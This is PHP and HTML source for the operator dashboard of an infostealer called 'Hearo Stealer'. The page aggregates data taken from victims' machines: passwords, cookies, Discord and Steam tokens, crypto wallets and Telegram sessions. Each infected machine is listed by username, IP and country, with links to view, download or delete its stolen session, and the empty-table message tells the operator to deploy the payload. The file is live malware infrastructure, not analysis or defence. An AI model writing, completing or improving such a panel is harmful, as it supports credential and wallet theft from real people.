<?php
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

$totalVictims   = $db->query("SELECT COUNT(DISTINCT session_hash) FROM logs")->fetchColumn() ?: 0;
$totalPasswords = $db->query("SELECT SUM(passwords_count) FROM logs")->fetchColumn() ?: 0;
$totalCookies   = $db->query("SELECT SUM(cookies_count) FROM logs")->fetchColumn() ?: 0;
$totalDiscord   = $db->query("SELECT SUM(discord_tokens) FROM logs")->fetchColumn() ?: 0;
$totalSteam     = $db->query("SELECT SUM(steam_tokens) FROM logs")->fetchColumn() ?: 0;
$totalCrypto    = $db->query("SELECT SUM(crypto_wallets) FROM logs")->fetchColumn() ?: 0;
$totalTelegram  = $db->query("SELECT SUM(telegram_sessions) FROM logs")->fetchColumn() ?: 0;

$logs = $db->query("SELECT * FROM logs ORDER BY captured_at DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard — Hearo Stealer</title>
    <link rel="icon" href="xeff/assets/logo.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="xeff/css/elite.css">
    <link rel="stylesheet" href="xeff/assets/theme.css">
</head>
<body>
    <div class="ambient-glow"></div>
    <div class="noise"></div>

    <?php include 'xeff/includes/navbar.php'; ?>

    <div class="container">
        <header>
            <h1>Dashboard</h1>
            <p>Advanced real-time victim data stealer system</p>
        </header>

        <div class="stats-grid">
            <div class="stat-card"><div class="stat-value"><?= number_format($totalVictims) ?></div><div class="stat-label">Logged Victims</div></div>
            <div class="stat-card"><div class="stat-value"><?= number_format($totalPasswords) ?></div><div class="stat-label">Passwords</div></div>
            <div class="stat-card"><div class="stat-value"><?= number_format($totalCookies) ?></div><div class="stat-label">Cookies</div></div>
            <div class="stat-card"><div class="stat-value"><?= number_format($totalDiscord) ?></div><div class="stat-label">Discord Tokens</div></div>
        </div>

        <div class="search-container">
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass"></i>
                <input type="text" id="searchInput" placeholder="Search by IP, computer name, username, country..." oninput="filterTable()">
            </div>
        </div>

        <div class="table-header-flex">
            <div class="table-title">Stolen Logs</div>
            <div class="table-count"><?= count($logs) ?> targets loaded</div>
        </div>

        <div class="data-table-container">
            <table>
                <thead>
                    <tr>
                        <th>Machine & User</th>
                        <th>Owner</th>
                        <th>IP & Location</th>
                        <th>Credentials</th>
                        <th>Captured Time</th>
                        <th style="text-align: right;">Actions</th>
                    </tr>
                </thead>
                <tbody id="logsTable">
                    <?php if (empty($logs)): ?>
                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding: 40px;">No logs found. Deploy payload to start gathering data.</td></tr>
                    <?php else: ?>
                        <?php foreach($logs as $log): ?>
                        <tr class="log-row" data-search="<?= strtolower(sanitize($log['computer_name'] . ' ' . $log['username'] . ' ' . $log['ip'] . ' ' . $log['country'])) ?>" data-hash="<?= sanitize($log['session_hash']) ?>">
                            <td>
                                <div class="cell-machine">
                                    <i class="fa-solid fa-desktop"></i>
                                    <div class="cell-info">
                                        <span class="cell-title"><?= sanitize($log['computer_name']) ?></span>
                                        <span class="cell-sub"><?= sanitize($log['username']) ?></span>
                                    </div>
                                </div>
                            </td>
                            <td>
                                <div class="tag-owner"><i class="fa-solid fa-circle"></i> <?= sanitize($log['builder_user'] ?: 'unregistered') ?></div>
                            </td>
                            <td>
                                <div class="cell-info">
                                    <span class="cell-title"><?= sanitize($log['ip']) ?></span>
                                    <span class="cell-sub"><?= sanitize($log['country']) ?> · <?= sanitize($log['os_version']) ?></span>
                                </div>
                            </td>
                            <td>
                                <div class="cred-badges">
                                    <div class="cred-badge"><i class="fa-solid fa-key"></i> <?= $log['passwords_count'] ?></div>
                                    <div class="cred-badge"><i class="fa-solid fa-cookie"></i> <?= $log['cookies_count'] ?></div>
                                    <div class="cred-badge"><i class="fa-brands fa-discord"></i> <?= $log['discord_tokens'] ?></div>
                                    <div class="cred-badge"><i class="fa-solid fa-wallet"></i> <?= $log['crypto_wallets'] ?></div>
                                    <?php if ($log['steam_tokens'] > 0): ?><div class="cred-badge"><i class="fa-brands fa-steam"></i> <?= $log['steam_tokens'] ?></div><?php endif; ?>
                                    <?php if ($log['telegram_sessions'] > 0): ?><div class="cred-badge"><i class="fa-brands fa-telegram"></i> <?= $log['telegram_sessions'] ?></div><?php endif; ?>
                                </div>
                            </td>
                            <td class="time-cell"><?= date('M d, H:i', strtotime($log['captured_at'])) ?></td>
                            <td>
                                <div class="actions">
                                    <a href="view_session.php?session=<?= urlencode($log['session_hash']) ?>" class="btn-action"><i class="fa-regular fa-eye"></i> View</a>
                                    <?php if (!empty($log['data_path'])): ?>
                                    <a href="download.php?hash=<?= urlencode($log['session_hash']) ?>" class="btn-action"><i class="fa-solid fa-download"></i></a>
                                    <?php endif; ?>
                                    <button class="btn-action btn-delete" onclick="deleteLog('<?= sanitize($log['session_hash']) ?>', this)"><i class="fa-regular fa-trash-can"></i></button>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        function filterTable() {
            const q = document.getElementById('searchInput').value.toLowerCase();
            document.querySelectorAll('.log-row').forEach(row => {
                row.style.display = row.dataset.search.includes(q) ? '' : 'none';
            });
        }

        function deleteLog(hash, btn) {
            if (!confirm('Delete this log permanently?')) return;
            const row = btn.closest('tr');
            fetch('delete_log.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'session_hash=' + encodeURIComponent(hash)
            })
            .then(r => r.json())
            .then(d => {
                if (d.status === 'deleted') {
                    row.style.opacity = '0';
                    setTimeout(() => row.remove(), 300);
                } else {
                    alert(d.error || 'Failed to delete');
                }
            })
            .catch(() => alert('Network error'));
        }
    </script>
</body>
</html>
